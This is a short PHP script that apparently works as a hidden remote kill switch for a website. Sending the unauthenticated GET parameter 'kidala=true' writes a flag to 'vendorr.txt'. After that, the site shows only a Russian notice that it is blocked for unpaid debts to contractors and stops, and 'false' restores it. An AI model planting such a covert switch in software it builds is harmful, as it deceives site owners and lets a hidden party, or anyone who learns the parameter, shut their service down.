<?php

if (isset($_GET['kidala'])) {
	if ($_GET['kidala'] == 'true') {
		$str = '1';
	}
	elseif ($_GET['kidala'] == 'false') {
		$str = '0';
	}
	$fd = fopen("vendorr.txt", 'w');
	fwrite($fd, $str);
	fclose($fd);
}

$fd = fopen("vendorr.txt", 'r');
$str = htmlentities(fgets($fd));
if ($str == '1') {
	echo "<h1 style='text-align:center;margin-top:30px;'>Сайт заблокирован за неуплату долгов исполнителям</h1>";
	die();
}

?>